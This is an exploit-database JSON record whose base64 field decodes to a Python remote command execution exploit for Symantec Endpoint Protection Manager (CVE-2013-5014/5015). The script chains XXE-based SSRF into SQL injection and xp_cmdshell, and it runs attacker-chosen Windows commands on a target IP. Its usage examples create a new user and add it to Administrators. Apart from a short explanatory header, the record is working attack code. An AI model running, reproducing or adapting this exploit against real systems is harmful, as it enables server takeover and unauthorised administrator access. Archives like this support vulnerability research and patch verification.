{
    "source": "exploit-database", 
    "exploit": "aW1wb3J0IGFyZ3BhcnNlDQppbXBvcnQgaHR0cGxpYg0KDQoiIiINCkV4cGxvaXQgVGl0bGU6IFN5bWFudGVjIEVuZHBvaW50IFByb3RlY3Rpb24gTWFuYWdlciBSZW1vdGUgQ29tbWFuZCBFeGVjdXRpb24NCkV4cGxvaXQgQXV0aG9yOiBDaHJpcyBHcmFoYW0gQGNncmFoYW1zZXZlbg0KQ1ZFOiBDVkUtMjAxMy01MDE0LCBDVkUtMjAxMy01MDE1DQpEYXRlOiBGZWJydWFyeSAyMiwgMjAxNA0KVmVuZG9yIEhvbWVwYWdlOiBodHRwOi8vd3d3LnN5bWFudGVjLmNvbS9lbmRwb2ludC1wcm90ZWN0aW9uDQpWZXJzaW9uOiAxMS4wLCAxMi4wLCAxMi4xDQpUZXN0ZWQgT246IFdpbmRvd3MgU2VydmVyIDIwMDMsIGRlZmF1bHQgU0VQTSBpbnN0YWxsIHVzaW5nIGVtYmVkZGVkIGRhdGFiYXNlDQpSZWZlcmVuY2VzOiBodHRwczovL3d3dy5zZWMtY29uc3VsdC5jb20vZnhkYXRhL3NlY2NvbnMvcHJvZC90ZW1lZGlhL2Fkdmlzb3JpZXNfdHh0LzIwMTQwMjE4LTBfU3ltYW50ZWNfRW5kcG9pbnRfUHJvdGVjdGlvbl9NdWx0aXBsZV9jcml0aWNhbF92dWxuZXJhYmlsaXRpZXNfd29fcG9jX3YxMC50eHQNCmh0dHA6Ly93d3cuc3ltYW50ZWMuY29tL3NlY3VyaXR5X3Jlc3BvbnNlL3NlY3VyaXR5dXBkYXRlcy9kZXRhaWwuanNwP2ZpZD1zZWN1cml0eV9hZHZpc29yeSZwdmlkPXNlY3VyaXR5X2Fkdmlzb3J5JnllYXI9JnN1aWQ9MjAxNDAyMTNfMDANCkRldGFpbHM6DQoNCkZpcnN0IG9mZiwgdGhpcyB3YXMgYSBmYW50YXN0aWMgZGlzY292ZXJ5IGJ5IFN0ZWZhbiBWaWVoYm9jay4gVGhlIGFidXNlIG9mIHRoZSBYWEUgDQppbmplY3Rpb24gdG8gZm9yY2UgU0VQTSB0byBleHBsb2l0IGl0c2VsZiB0aHJvdWdoIGEgc2VwYXJhdGUgU1FMIGluamVjdGlvbiBmbGF3IHdhcyANCnBhcnRpY3VsYXJseSBhbXVzaW5nLiBJIHN1c3BlY3QgdGhlIG1ham9yaXR5IG9mIFNFUE0gdXNlcnMgd2lsbCBoYXZlIGl0IGNvbmZpZ3VyZWQNCndpdGggdGhlIGRlZmF1bHQgZW1iZWRkZWQgZGF0YWJhc2UsIHRoZXJlYnkgbWFraW5nIHRoaXMgYSBwcmV0dHkgcmVsaWFibGUgZXhwbG9pdC4NCg0KU28gYmFzaWNhbGx5IHdoYXQgeW91IGFyZSBsb29raW5nIGZvciB3aXRoIHRoZSBYWEUgaW5qZWN0aW9uIGlzIGEgdnVsbmVyYWJpbGl0eSANCnRoYXQgY2FuIGJlIHRyaWdnZXJlZCBpbiB0aGUgQ29uc29sZVNlcnZsZXQuIFdoZW4gYSBtdWx0aXBhcnQgaHR0cCByZXF1ZXN0IGlzIHNlbnQsIA0KdGhlIHNlcnZsZXQgd2lsbCB1c2UgYSBjdXN0b20gTXVsdGlwYXJ0UGFyc2VyIGNsYXNzIHRvIGhhbmRsZSB0aGUgaW5kaXZpZHVhbCANCm11bHRpcGFydCBib2RpZXMuIFdoZW4gYSBib2R5IGlzIGVuY291bnRlcmVkIHRoYXQgdXNlcyBhIENvbnRlbnQtVHlwZSBvZiB0ZXh0L3htbCwgDQp0aGUgSmF2YSBEb2N1bWVudEJ1aWxkZXIgY2xhc3MgaXMgdXNlZCB0byBwYXJzZSB0aGUgeG1sLiBTaW5jZSBTeW1hbnRlYyBkaWQgbm90IA0KZGlzYWxsb3cgZGVjbGFyZWQgRFREIHByb2Nlc3NpbmcsIGl0IGlzIHZ1bG5lcmFibGUgdG8gdGhlIFhYRSBpbmplY3Rpb24uIFRoaXMgDQphcHBlYXJzIHRvIGJlIGEgYmxpbmQgWFhFLCBzbyBhIGJldHRlciB1c2Ugb2YgdGhlIHZ1bG5lcmFiaWxpdHkgaXMgdXNlIGl0IGZvciBTU1JGLg0KVGhhdCBsZWFkcyB1cyB0byB0aGUgU1FMIGluamVjdGlvbiBmbGF3Lg0KDQpTeW1hbnRlYyBoYXMgYW4gaHR0cCByZXF1ZXN0IGhhbmRsZXIgY2FsbGVkIENvbmZpZ1NlcnZlckhhbmRsZXIgdGhhdCBpcyBwcm9ncmFtbWF0aWNhbGx5IA0KcmVzdHJpY3RlZCB0byBvbmx5IGhhbmRsZSByZXF1ZXN0cyB0aGF0IGNvbWUgZnJvbSBsb2NhbGhvc3QuIEkgZ3Vlc3Mgd2hlbiB0aGV5IHdyb3RlIHRoaXMgDQp0aGV5IGp1c3QgYXNzdW1lZCB0aGF0IHRoZXJlIHdhcyBuZXZlciBnb2luZyB0byBiZSBhIHdheSB0byBzZW5kIHVudHJ1c3RlZCBpbnB1dCB0byBpdCANCnNpbmNlIGl0IHdhcyBhbHdheXMgZ29pbmcgdG8gYmUgY29udHJvbGxlZCBieSB0aGVtLiBJIGJhc2UgdGhpcyBndWVzcyBvbiB0aGUgZmFjdCB0aGF0IA0KdGhlcmUgaXMgYWJzb2x1dGVseSBubyBhdHRlbXB0IG1hZGUgdG8gdmFsaWRhdGUgd2hhdCBpbnB1dCBjb21lcyBpbiB0byB0aGUgDQp1cGRhdGVSZXBvcnRpbmdWZXJzaW9uIGZ1bmN0aW9uIHdoaWNoIHNob3ZlcyBpdCBkaXJlY3RseSBpbnRvIGEgU1FMIHF1ZXJ5IHVuZmlsdGVyZWQuIEluIA0Kb3JkZXIgdG8gdHJpZ2dlciB0aGUgU1FMIGluamVjdGlvbiB5b3UganVzdCBuZWVkIHRvIHNlbmQgdGhlIFNRTCBpbmplY3Rpb24gc3RyaW5nIGluIHRoZSANCiJQYXJhbWV0ZXIiIHVybCBwYXJhbSB3aXRoIHRoZSAiYWN0aW9uIiBwYXJhbSBzZXQgdG8gdGVzdF9hdi4gT24gYSBkZWZhdWx0IGluc3RhbGwgb2YgU0VQTSwgDQppdCB1c2VzIGEgU1FMIEFueXdoZXJlIGVtYmVkZGVkIGRhdGFiYXNlLiBNdWNoIGxpa2UgTVNTUUwsIFNRTCBBbnl3aGVyZSBoYXMgYW4geHBfY21kc2hlbGwgDQpzdG9yZWQgcHJvY2VkdXJlIHRvIHJ1biBsb2NhbCBPUyBjb21tYW5kcy4gVXNpbmcgdGhpcyBzdG9yZWQgcHJvY2VkdXJlLCB5b3UgY2FuIGNvbXByb21pc2UgDQp0aGUgc2VydmVyIHRoYXQgaXMgcnVubmluZyBTRVBNLiANCg0KRXhhbXBsZSBVc2FnZTogDQpweXRob24gc2VwbV94eGVfZXhwbG9pdC5weSAtdCAxOTIuMTY4LjEuMTAwIC1jICJuZXQgdXNlciBteWFkbWluIHBAc3MhMjMgL2FkZCINCnB5dGhvbiBzZXBtX3h4ZV9leHBsb2l0LnB5IC10IDE5Mi4xNjguMS4xMDAgLWMgIm5ldCBsb2NhbGdyb3VwIEFkbWluaXN0cmF0b3JzIG15YWRtaW4gL2FkZCINCiIiIg0KDQptdWx0aXBhcnRfYm9keSA9IFwNCiItLS0tLS09X1BhcnRfMTU2XzMzMDEwNzE1LjEyMzRcclxuIiArIFwNCiJDb250ZW50LVR5cGU6IHRleHQveG1sXHJcbiIgKyBcDQoiQ29udGVudC1EaXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPVwiQ29udGVudFwiXHJcblxyXG4iICsgXA0KIjw/eG1sIHZlcnNpb249XCIxLjBcIiBlbmNvZGluZz1cIlVURi04XCI/PlxyXG4iICsgXA0KIjwhRE9DVFlQRSBzZXBtIFs8IUVOVElUWSBwYXlsb2FkIFNZU1RFTSAiICsgXA0KIlwiaHR0cDovLzEyNy4wLjAuMTo5MDkwL3NlcnZsZXQvQ29uc29sZVNlcnZsZXQ/QWN0aW9uVHlwZT1Db25maWdTZXJ2ZXImYWN0aW9uPXRlc3RfYXYiICsgXA0KIiZTZXF1ZW5jZU51bT0xNDAzMjAxMjEmUGFyYW1ldGVyPWEnOyBjYWxsIHhwX2NtZHNoZWxsKCclcycpOy0tXCIgPl0+XHJcbiIgKyBcDQoiPHJlcXVlc3Q+XHJcbiIgKyBcDQoiPHh4ZT4mcGF5bG9hZDs8L3h4ZT5cclxuIiArIFwNCiI8L3JlcXVlc3Q+XHJcbiIgKyBcDQoiLS0tLS0tPV9QYXJ0XzE1Nl8zMzAxMDcxNS4xMjM0LS1cclxuIg0KaGVhZGVycyA9IHsnQ29udGVudC1UeXBlJzoibXVsdGlwYXJ0L2Zvcm0tZGF0YTsgYm91bmRhcnk9XCItLS0tPV9QYXJ0XzE1Nl8zMzAxMDcxNS4xMjM0XCIifQ0KDQpjbWRsaW5lX3BhcnNlciA9IGFyZ3BhcnNlLkFyZ3VtZW50UGFyc2VyKGRlc2NyaXB0aW9uPSdTeW1hbnRlYyBFbmRwb2ludCBQcm90ZWN0aW9uIE1hbmFnZXInICsgXA0KJyBSZW1vdGUgQ29tbWFuZCBFeGVjdXRpb24nKQ0KY21kbGluZV9wYXJzZXIuYWRkX2FyZ3VtZW50KCctdCcsIGRlc3Q9J2lwJywgaGVscD0nVGFyZ2V0IElQJywgcmVxdWlyZWQ9VHJ1ZSkNCmNtZGxpbmVfcGFyc2VyLmFkZF9hcmd1bWVudCgnLXAnLCBkZXN0PSdwb3J0JywgaGVscD0nVGFyZ2V0IFBvcnQnLCBkZWZhdWx0PTkwOTAsIFwNCnR5cGU9aW50LCByZXF1aXJlZD1GYWxzZSkNCmNtZGxpbmVfcGFyc2VyLmFkZF9hcmd1bWVudCgnLXNzbCcsIGRlc3Q9J3NzbCcsIGhlbHA9J1VzZXMgU1NMIChzZXQgdG8gMSBmb3IgdHJ1ZSknLCBcDQpkZWZhdWx0PTAsIHR5cGU9aW50LCByZXF1aXJlZD1GYWxzZSkNCmNtZGxpbmVfcGFyc2VyLmFkZF9hcmd1bWVudCgnLWMnLCBkZXN0PSdjbWQnLCBoZWxwPSdXaW5kb3dzIGNtZCB0byBydW4gKG11c3QgYmUgaW4gcXVvdGVzIGllICJuZXQgdXNlciIpJywgXA0KcmVxdWlyZWQ9VHJ1ZSkNCmFyZ3MgPSBjbWRsaW5lX3BhcnNlci5wYXJzZV9hcmdzKCkNCg0KaWYgYXJncy5zc2wgPT0gMToNCiAgICBjb25uID0gaHR0cGxpYi5IVFRQU0Nvbm5lY3Rpb24oYXJncy5pcCwgYXJncy5wb3J0KQ0KZWxzZToNCiAgICBjb25uID0gaHR0cGxpYi5IVFRQQ29ubmVjdGlvbihhcmdzLmlwLCBhcmdzLnBvcnQpDQptdWx0aXBhcnRfYm9keSA9IG11bHRpcGFydF9ib2R5ICUgKGFyZ3MuY21kKQ0KcHJpbnQgIlxuWypdQXR0ZW1wdGluZyB0byBleHBsb2l0IFhYRSBhbmQgcnVuIGxvY2FsIHdpbmRvd3MgY29tbWFuZDogIiArIGFyZ3MuY21kDQpjb25uLnJlcXVlc3QoIlBPU1QiLCAiL3NlcnZsZXQvQ29uc29sZVNlcnZsZXQ/QWN0aW9uVHlwZT1Db25zb2xlTG9nIiwgbXVsdGlwYXJ0X2JvZHksIGhlYWRlcnMpDQpyZXMgPSBjb25uLmdldHJlc3BvbnNlKCkNCmlmIHJlcy5zdGF0dXMgIT0gMjAwOg0KICAgIHByaW50ICJbLV1FeHBsb2l0IHVuc3VjY2Vzc2Z1bCEgU2VydmVyIHJldHVybmVkOlxuIiArIHJlcy5yZWFkKCkNCmVsc2U6DQogICAgcHJpbnQgIlsrXUV4cGxvaXQgc3VjY2Vzc2Z1bGx5IHNlbnQhIg==", 
    "filename": "platforms/windows/remote/31853.py", 
    "id": "31853", 
    "cves": [
        "CVE-2013-5015", 
        "CVE-2013-5014"
    ]
}